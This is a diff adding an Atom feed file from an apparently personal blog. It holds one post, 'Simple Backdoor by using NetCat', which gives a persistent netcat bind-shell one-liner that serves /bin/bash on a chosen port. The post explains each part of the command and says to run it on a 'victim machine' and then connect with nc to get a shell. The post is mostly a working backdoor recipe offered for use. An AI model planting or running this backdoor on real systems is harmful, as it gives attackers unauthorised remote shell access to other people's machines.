@@ -1,0 +1,27 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom"><title>Just for noting - Backdoor</title><link href="https://blog.m157q.tw/" rel="alternate"></link><link href="https://blog.m157q.tw/feeds/tag.backdoor.atom.xml" rel="self"></link><id>https://blog.m157q.tw/</id><updated>2015-10-27T12:13:00+08:00</updated><entry><title>Simple Backdoor by using NetCat</title><link href="https://blog.m157q.tw/posts/2014/07/06/simple-backdoor-by-using-netcat/" rel="alternate"></link><published>2014-07-06T11:03:00+08:00</published><updated>2015-10-27T12:13:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2014-07-06:/posts/2014/07/06/simple-backdoor-by-using-netcat/</id><summary type="html">&lt;h2&gt;The one line script&lt;/h2&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ nohup …&lt;/pre&gt;&lt;/div&gt;</summary><content type="html">&lt;h2&gt;The one line script&lt;/h2&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ nohup bash -c &lt;span class="s1"&gt;&amp;#39;while true; do nc -l -e /bin/bash -p ${port}; done&amp;#39;&lt;/span&gt; &lt;span class="p"&gt;&amp;amp;&lt;/span&gt;  
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h2&gt;How this works&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;nohup&lt;/code&gt; makes this backdoor immune to SIGHUP  &lt;/li&gt;
+&lt;li&gt;&lt;code&gt;bash -c ${string}&lt;/code&gt; will run the &lt;code&gt;${string}&lt;/code&gt; as command  &lt;/li&gt;
+&lt;li&gt;&lt;code&gt;nc -l&lt;/code&gt; let nc keep listening on the port  &lt;/li&gt;
+&lt;li&gt;&lt;code&gt;nc -e ${sth}&lt;/code&gt; means excute &lt;code&gt;${sth}&lt;/code&gt; after connected  &lt;/li&gt;
+&lt;li&gt;&lt;code&gt;nc -p&lt;/code&gt; to choose a port for nc to listen  &lt;/li&gt;
+&lt;li&gt;&lt;code&gt;${port}&lt;/code&gt; is the backdoor port set on the victim machine.  &lt;ul&gt;
+&lt;li&gt;You can change it to a port number whatever you like.  &lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;use shell scripting &lt;code&gt;while&lt;/code&gt; for keeping listening  &lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2&gt;How to use&lt;/h2&gt;
+&lt;p&gt;After run the command above on the victim machine, you can just type  &lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ nc &lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;victim_ip&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt; &lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;port&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;  
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;to connect to the victim machine and get a bash shell as the same uid which ran the command.  &lt;/p&gt;</content><category term="NetCat"></category><category term="nc"></category><category term="Backdoor"></category><category term="Security"></category></entry></feed>
